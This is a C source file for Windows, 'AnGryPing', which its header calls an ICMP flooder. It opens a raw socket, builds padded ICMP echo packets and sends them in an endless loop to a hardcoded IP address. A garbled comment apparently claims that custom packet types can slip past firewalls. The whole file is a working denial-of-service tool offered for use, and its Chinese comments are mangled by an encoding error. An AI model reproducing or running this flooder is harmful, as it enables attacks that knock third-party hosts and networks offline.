/*
agp.c
AnGryPing -- ICMPFlooder by HBU��С��(LK007)
Copyright(C) 2002
E-MAIL:lk007@163.com
*/
#include "stdafx.h"
#include<stdio.h> 
#include <winsock2.h> 
#include <ws2tcpip.h> 
#pragma comment(lib, "ws2_32.lib")
//ͷ�ļ��Ϳ��ļ�������������ܱ��룬����Link�����ws2_32.lib
#define false 0
#define true 1
#define SEQ0x28376839
// ����ICMP�ײ�
typedef struct _ihdr
{
	BYTE i_type; //8λ����
	BYTE i_code; //8λ����
	USHORT i_cksum; //16λУ���
	USHORT i_id; //ʶ���
	USHORT i_seq; //�������к�
	ULONG timestamp; //ʱ���
}ICMP_HEADER;
//����У��͵��Ӻ���
USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum=0;
	while(size >1)
	{
		cksum+=*buffer++;
		size -=sizeof(USHORT);
	}
	if(size )
	{
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >>16);
	return (USHORT)(~cksum);
}
int main(int argc,char **argv)
{
	int datasize,ErrorCode,flag;
	int TimeOut=2000, SendSEQ=0,PacketSize=32,type=8,code=0,counter=0; //Ĭ����������
	char SendBuf[65535]={0}; //����
	WSADATA wsaData;
	SOCKET SockRaw=(SOCKET)NULL;
	struct sockaddr_in DestAddr;
	ICMP_HEADER icmp_header;
	char DestIp[20]; //Ŀ��IP
// 	if(argc<2)
// 	{
// 		printf("AngryPing by HBU-LK007\n");
// 		printf("Usage:%s [Dest] <PacketSize><type> <code>\n",argv[0]); 
// 		//�����û��Զ������ݰ���С�����͡����룬�����ƹ�һЩ����ǽ����һЩ����ı���Flood
// 		exit(0);
// 	}
	strcpy(DestIp,"192.168.30.100");
	PacketSize=300; //ȡ�����ݴ�С
	if (PacketSize>65500) 
	{ 
		printf("Packet size must less than 65500\n"); //̫����޷�����IP���ݱ���
		exit(0); 
	}
	type=8; //ȡ������ֵ
	if (type>16) 
	{ 
		printf("Type must less than 16\n"); 
		exit(0); 
	}
	code=0; //ȡ�ô���ֵ
	//��ʼ��SOCK_RAW
	if((ErrorCode=WSAStartup(MAKEWORD(2,1),&wsaData))!=0)
	{
		fprintf(stderr,"WSAStartup failed:%d\n",ErrorCode);
		exit(0);
	}
	if((SockRaw=WSASocket(AF_INET,SOCK_RAW,IPPROTO_ICMP,NULL,0,WSA_FLAG_OVERLAPPED))==INVALID_SOCKET)
	{
		fprintf(stderr,"WSASocket failed:%d\n",WSAGetLastError());
		exit(0);
	}
	flag=TRUE;
	{
		//���÷��ͳ�ʱ
		ErrorCode=setsockopt(SockRaw,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut));
		if (ErrorCode==SOCKET_ERROR)
		{
			fprintf(stderr,"Failed to set send TimeOut:%d\n",WSAGetLastError());
			exit(1);
		}
		//��Ҫ���뿪ʼ
		printf("Dest:%s   packet:%d   type:%d  code:%d\n\n",argv[1],PacketSize,type,code);
		printf("Starting...\n\n");   //�Ӿ�Ч��:P
		memset(&DestAddr,0,sizeof(DestAddr));
		DestAddr.sin_family=AF_INET;
		DestAddr.sin_addr.s_addr=inet_addr(DestIp); //���Socket�ṹ
		//���ICMP�ײ�
		icmp_header.i_type = type;
		icmp_header.i_code = code;
		icmp_header.i_cksum = 0; //У�����0
		icmp_header.i_id = 2;
		icmp_header.timestamp = GetTickCount(); //ʱ���
		icmp_header.i_seq=999;
		memcpy(SendBuf, &icmp_header, sizeof(icmp_header)); //���ICMP���ĺ�ͷ��
		memset(SendBuf+sizeof(icmp_header), 'E', PacketSize); //��E���ICMP����
		icmp_header.i_cksum = checksum((USHORT *)SendBuf,sizeof(icmp_header)+PacketSize); //����У���
		datasize=sizeof(icmp_header)+PacketSize; //�����������ݰ���С
		//��ʼ����
		while(1){ //����ѭ������Ctrl+C����
			/*
			�����printfʵ������Ϊ����ʱ��Flood������ñ�����ô�����Ľ�����ַ���ʾ�������Լ���������Ѹ����������Ч�ʣ���Ȼ������ܲ���ʾ��ã�����ȥ��printf�󣬳��������ˣ�̫�죿���������á�Sending1024 packets...�����Ǵ����������ʱ�����Ըĳ�printf("."); һ��С�㡣�������Լ��ã��õ�˳�־Ϳ��ԡ�
			*/
			printf("Sending 1024 packets...\n");
			for(counter=0;counter<1024;counter++){ //ѭ������1024�����ݰ�Ϊһ��
				//����ICMP����
				ErrorCode=sendto(SockRaw,SendBuf,datasize,0,(struct sockaddr*)&DestAddr,sizeof(DestAddr));
				if (ErrorCode==SOCKET_ERROR) printf("\nSendError:%d\n",GetLastError());
			}
		}
	}
	{
		if (SockRaw != INVALID_SOCKET) closesocket(SockRaw);
		WSACleanup();
	}
	return 0;
}